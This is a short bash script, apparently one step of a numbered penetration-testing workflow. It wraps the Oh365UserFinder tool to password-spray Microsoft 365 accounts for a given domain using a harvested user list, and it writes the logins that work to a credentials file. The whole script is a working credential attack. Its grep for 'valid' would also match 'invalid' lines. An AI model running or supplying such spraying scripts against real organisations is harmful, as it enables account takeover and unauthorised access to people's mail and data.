#!/bin/bash

# Script to check provided password for a list of users from ./6/<domain>_users.txt

# Check if password and domain are provided
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <password> <domain>"
  exit 1
fi

PASSWORD=$1
DOMAIN=$2
USERLIST="./6/${DOMAIN}_users.txt"
RESULTS="./7/${DOMAIN}_results.txt"
CREDENTIALS="./7/${DOMAIN}_credentials.txt"

# Check if the user list file exists
if [ ! -f "$USERLIST" ]; then
  echo "Error: User list file '$USERLIST' not found."
  exit 1
fi

# Create the ./7 directory if it doesn't exist
mkdir -p ./7

# Run the oh365userfinder tool with the provided password and user list
python3 /opt/pentestcloud/Oh365UserFinder/oh365userfinder.py -p "$PASSWORD" --pwspray --elist "$USERLIST" > "$RESULTS"

# Check if the results file exists and contains valid logins
if [ ! -f "$RESULTS" ]; then
  echo "Error: Results file '$RESULTS' not found."
  exit 1
fi

# Process results and save valid logins and passwords
grep "valid" "$RESULTS" | awk -F'[ ]+' '{print $1 ":" $2}' > "$CREDENTIALS"

echo "Credentials have been saved to '$CREDENTIALS'"
